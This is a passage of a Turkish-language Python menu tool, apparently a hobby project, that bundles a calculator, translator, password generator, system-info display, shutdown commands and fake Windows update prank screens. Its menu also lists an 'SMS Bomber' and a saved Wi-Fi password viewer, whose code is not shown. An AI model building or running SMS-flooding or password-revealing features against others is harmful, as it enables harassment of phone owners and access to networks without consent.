    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        print(f"Bilgisayarın Yerel IP Adresi: {local_ip}")
    except Exception as e:
        print(f"Yerel IP adresi alınırken bir hata oluştu: {e}")


def bilgisayar_bilgisi():
    sistem = platform.system()
    isletim_sistemi = platform.version()
    isletim_sistemi_bit = platform.architecture()[0]
    isletim_sistemi_surum = platform.version()

    print(f"\nİşletim Sistemi: {isletim_sistemi} {isletim_sistemi_bit}-bit")
    print(f"İşletim Sistemi Sürümü: {isletim_sistemi_surum}")

    cpu_bilgisi = platform.processor()
    print(f"İşlemci: {cpu_bilgisi}")

    ram_bilgisi = psutil.virtual_memory()
    print(f"RAM Kapasitesi: {ram_bilgisi.total / (1024 ** 3):.2f} GB")

    try:
        gpus = GPUtil.getGPUs()
        for i, gpu in enumerate(gpus):
            print(f"\nGPU {i + 1}:")
            print(f"Model: {gpu.name}")
            print(f"Bellek Kapasitesi: {gpu.memoryTotal} MB")
            print(f"Kullanılan Bellek: {gpu.memoryUsed} MB")
            print(f"Boşta Bekleme Zamanı: {gpu.memoryFree} MB")
    except Exception as e:
        print(f"Ekran kartı bilgisi alınırken bir hata oluştu: {e}")

    monitörler = gw.getAllTitles()
    monitörler = [monitor for monitor in monitörler if monitor]  # Boş olmayanları filtrele
    print("\nMonitörler:")
    for i, monitor in enumerate(monitörler, start=1):
        print(f"{i}. Monitör: {monitor}")


def hesap_makinesi():
    print("\n[1] Toplama")
    print("[2] Çıkarma")
    print("[3] Çarpma")
    print("[4] Bölme")
    print("[5] Karesini Alma")

    secim_hesap_makinesi = input("Yapmak istediğiniz hesap makinesi işlemi: ")

    if secim_hesap_makinesi == '1':
        toplama()
    elif secim_hesap_makinesi == '2':
        cikarma()
    elif secim_hesap_makinesi == '3':
        carpma()
    elif secim_hesap_makinesi == '4':
        bolme()
    elif secim_hesap_makinesi == '5':
        karesini_alma()
    else:
        print("Geçersiz seçenek. Lütfen tekrar deneyin.")


def toplama():
    sayi1 = float(input("Birinci sayıyı girin: "))
    sayi2 = float(input("İkinci sayıyı girin: "))
    toplam = sayi1 + sayi2
    print(f"{sayi1} + {sayi2} = {toplam}")


def cikarma():
    sayi1 = float(input("Birinci sayıyı girin: "))
    sayi2 = float(input("İkinci sayıyı girin: "))
    fark = sayi1 - sayi2
    print(f"{sayi1} - {sayi2} = {fark}")


def carpma():
    sayi1 = float(input("Birinci sayıyı girin: "))
    sayi2 = float(input("İkinci sayıyı girin: "))
    carpim = sayi1 * sayi2
    print(f"{sayi1} * {sayi2} = {carpim}")


def bolme():
    sayi1 = float(input("Birinci sayıyı girin: "))
    sayi2 = float(input("İkinci sayıyı girin: "))
    if sayi2 != 0:
        bolum = sayi1 / sayi2
        print(f"{sayi1} / {sayi2} = {bolum}")
    else:
        print("Bir sayıyı sıfıra bölemezsiniz.")


def karesini_alma():
    sayi = float(input("Bir sayı girin: "))
    kare = sayi ** 2
    print(f"{sayi}'nin karesi = {kare}")


def kelimeyi_tersine_cevir():
    kelime = input("Bir kelime girin: ")
    ters_kelime = kelime[::-1]
    print(f"Girdiğiniz kelimenin ters çevrilmiş hali: {ters_kelime}")


def karakter_sayisini_bul():
    metin = input("Karakter sayısını bulmak istediğiniz metni girin: ")
    sayi = len(metin)
    print(f"Metnin karakter sayısı: {sayi}")

def rastgele_sifre_olustur():
    uzunluk = int(input("Şifrenin uzunluğunu girin: "))
    sifre = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(uzunluk))
    print(f"Oluşturulan Şifre: {sifre}")




import webbrowser
import time
import pyautogui

def fake_windows_update():
    fake_update_url = "https://fakeupdate.com.tr/win10ue/"
    webbrowser.open(fake_update_url)
    
    # Bekleme süresi (istenirse süre artırılabilir)
    time.sleep(0.3)

    # Ekranın tam ekran moduna geçilmesi
    pyautogui.hotkey('F11')




import os

def bilgisayar_ayarlari():
    print("\n[20] Bilgisayar Ayarları")
    print(colored("[1] Bilgisayarı Kapat", 'red'))
    print(colored("[2] Bilgisayarı Yeniden Başlat", 'green'))
    print(colored("[3] Bilgisayarı Uykuya Al", 'blue'))
    print(colored("[4] Kullanıcı Değiştir", "yellow"))
    print(colored("[q] Çıkış", 'red'))

    secim = input("Yapmak istediğiniz işlemi seçin: ")

    if secim == '1':
        bilgisayari_kapat()
    elif secim == '2':
        bilgisayari_yeniden_baslat()
    elif secim == '3':
        bilgisayari_uykuya_al()
    elif secim == '4':
        kullanici_degistir()
    elif secim.lower() == 'q':
        print("Programdan çıkılıyor...")
    else:
        print("Geçersiz seçenek.")

def bilgisayari_kapat():
    os.system("shutdown /s /t 0")

def bilgisayari_yeniden_baslat():
    os.system("shutdown /r /t 0")

def bilgisayari_uykuya_al():
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

def kullanici_degistir():
    os.system("shutdown -l")




def fake_windows_update11():
    fake_update_url = "https://fakeupdate.com.tr/win11/"
    webbrowser.open(fake_update_url)
    
    # Bekleme süresi (istenirse süre artırılabilir)
    time.sleep(0.3)

    # Ekranın tam ekran moduna geçilmesi
    pyautogui.hotkey('F11')





def cevir():
    translator = Translator()

    metin = input("Çevirmek istediğiniz metni girin: ")
    hedef_dil = input("Hedef dil kodunu girin (örneğin, 'en' for English): ")

    try:
        cevirilen_metin = translator.translate(metin, dest=hedef_dil).text
        print(f"Çeviri: {cevirilen_metin}")
    except Exception as e:
        print(f"Çeviri sırasında bir hata oluştu: {e}")


if __name__ == "__main__":
    while True:
        leenaut_ascii_art()
        print("İşlem Yaptıkan sonra Sonuçlar için Sayfayı Yukarı kaydırın.")
        print("\n" + colored("[1] Hesap Makinesi", 'blue'))
        print(colored("[2] Kelimeyi Tersine Çevirme", 'blue'))
        print(colored("[3] Çeviri", 'blue'))
        print(colored("[4] Karakter Sayısını Bulma", 'blue'))
        print(colored("[5] Büyük/Küçük Harfe Çevirme", 'blue'))
        print(colored("[6] Rastgele Şifre Oluşturma", 'blue'))
        print(colored("[7] Canlı Tarih ve Saat Gösterme", 'blue'))
        print(colored("[8] IP Adresini Gösterme", 'blue'))
        print(colored("[9] Wordlist Oluşturma", 'blue'))
        print(colored("[10] Bilgisayar Bilgisi Gösterme", 'blue'))
        print(colored("[11] Instagram", 'blue'))
        print(colored("[12] Bağlı Wi-Fi Şifresini Göster", 'blue'))
        print(colored("[13] E-Okul Ortalama Hesaplama", 'blue'))
        print(colored("[14] Metin Analiz", 'blue'))
        print(colored("[15] URL Kısalt", 'blue'))
        print(colored("[16] Hızlı Yazma Testi", 'blue'))
        print(colored("[17] PixLay Games Site", 'blue'))
        print(colored("[18] Fake Windows 10 Update Screen", 'blue'))
        print(colored("[19] Fake Windows 11 Update Screen", 'blue'))
        print(colored("[20] Bilgisayar Ayarları", 'blue'))
        print(colored("[21] SMS Bomber", 'blue'))
        
        print(colored("[q] Çıkış", 'red'))

        secim = input(colored("Yapmak istediğiniz işlemi seçin: ", 'yellow'))

        if secim == '1':
            hesap_makinesi()
        elif secim == '2':
            kelimeyi_tersine_cevir()
        elif secim == '3':
            cevir()
        elif secim == '4':
            karakter_sayisini_bul()
        elif secim == '5':
            buyuk_kucuk_harf_cevir()
        elif secim == '6':
            rastgele_sifre_olustur()
        elif secim == '7':
            canli_tarih_ve_saat()
        elif secim == '8':
            get_external_ip()
            get_local_ip()
        elif secim == '9':
            uzunluk = int(input("Kelime uzunluğunu girin: "))
            adet = int(input("Oluşturulacak kelime sayısını girin: "))
            dosya_adı = input("Wordlist'in kaydedileceği dosya adını girin: ")
            wordlist_olustur(uzunluk, adet, dosya_adı)
        elif secim == '10':
            bilgisayar_bilgisi()

        elif  secim == '11':
              instagrama_git()

        elif secim == '12':
            wifi_sifresi_goster()  

        elif secim == '13':
            e_okul_ortalama_hesapla()    

        elif secim == '14':
            metin_analiz_araci()

        elif secim == '15':
            url_kisaltma_menu()    


        elif secim == '16':
            hizli_yazma_testi()      


        elif secim == '17':
            pixlay_games_siteye_git()   


        elif secim == '18':
            fake_windows_update()     


        elif secim == '19':
            fake_windows_update11()    



        elif secim == '20':
            bilgisayar_ayarlari()

        elif secim == '21':
            start()


        elif secim.lower() == 'q':
            print("Programdan çıkılıyor...")
            break
        else:
            print("Geçersiz seçenek.")
        